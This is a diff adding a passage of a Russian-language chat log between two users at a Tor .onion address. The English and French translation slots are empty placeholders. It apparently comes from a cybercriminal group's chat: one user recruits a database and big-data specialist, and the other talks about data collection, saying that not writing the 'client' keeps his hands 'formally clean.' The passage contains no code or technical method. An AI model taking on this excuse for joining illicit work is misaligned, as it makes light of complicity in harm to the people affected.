+	[ru] сбор каких то данных .. но мне это не интересно
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:40:58.493582  zulas@q3mcco35auwcstmt.onion
+	[ru] клиента я не пишу . так что формально руки у меня белые )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:44:34.953077  buza@q3mcco35auwcstmt.onion
+	[ru] я отойду, подумаю
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:44:41.899707  buza@q3mcco35auwcstmt.onion
+	[ru] так значит ты не хочешь пачкать руки )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:45:02.523073  buza@q3mcco35auwcstmt.onion
+	[ru] вот такой вопрос
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:45:08.968222  buza@q3mcco35auwcstmt.onion
+	[ru] как у тебя с СУБД?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:45:45.395849  zulas@q3mcco35auwcstmt.onion
+	[ru] стандартно ) скуль .. всякие хранимки не очень . это не моё
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:46:00.486170  zulas@q3mcco35auwcstmt.onion
+	[ru] считаю что БД не должна содержать бизнес логику
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:46:03.116858  buza@q3mcco35auwcstmt.onion
+	[ru] мне нужен спец по субд
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:46:16.088360  buza@q3mcco35auwcstmt.onion
+	[ru] причем по разным, по множеству, с хорошим опытом
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:46:20.281251  zulas@q3mcco35auwcstmt.onion
+	[ru] ковырять параметры всякие ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:46:54.434857  buza@q3mcco35auwcstmt.onion
+	[ru] нет
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:47:02.682722  buza@q3mcco35auwcstmt.onion
+	[ru] бигдата
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:56:43.867421  zulas@q3mcco35auwcstmt.onion
+	[ru] а что именно ?
+	[en] <?>
+	[fr] <?>
+
